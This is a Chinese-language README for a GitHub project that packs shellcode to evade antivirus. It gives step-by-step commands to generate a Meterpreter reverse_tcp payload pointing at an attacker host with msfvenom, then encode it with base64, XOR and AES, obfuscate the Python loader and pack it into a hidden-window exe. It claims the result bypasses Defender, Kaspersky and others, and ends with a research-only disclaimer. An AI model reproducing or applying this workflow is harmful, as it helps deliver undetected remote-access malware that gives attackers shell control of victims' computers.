# python-shellcode-loader

简单介绍
免杀方式 msfvenom生成raw格式的shellcode-->base64-->XOR-->AES
将python代码缩小并混淆最后生成exe
目前过DF、360和火绒  virustotal：7/66过卡巴斯基、迈克菲等
获取项目
git clone https://github.com/HZzz2/python-shellcode-loader.git
cd python-shellcode-loader
生成shellcode
#生成shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=9999 -f raw > rev.raw
base64编码shellcode并替换jiami.py中的值
#base64
base64 -w 0 -i rev.raw > rev.bs64
cat rev.bs64
复制base64的值替换jiami.py中payload       也就是 第二十五行 sc='payload' 
加密base64并替换main.py中的值
#加密base64后的shellcode
python3 jiami.py
#会生成一个aes-xor.txt的文件，复制文件里的值(经过XOR和AES加密后)
复制的值替换main.py中的payload   也就是第四十一行 jiami_sc='payload'
缩小和混淆py代码
缩小python代码
pyminify main.py --output main-mini.py
混淆main-mini.py中的python代码
https://pyob.oxyry.com/  在线混淆

将混淆后的代码保存到一个文件中，比如文件名为:main-mini-ob.py
打包成可执行文件exe
#打包成exe
pyinstaller.exe -Fw -i .\setting.ico --key=leslie .\main-mini-ob.py
-F 打包为单文件 -w 不显示窗口   -i ico图标文件  --key  加密字节码的密钥
等待打包完成。。。。
打包好后的可执行程序在dist目录中
流程图

检测图







免责声明
仅供安全研究与教学之用，如果使用者将其做其他用途，由使用者承担全部法律及连带责任，本人不承担任何法律及连带责任。



























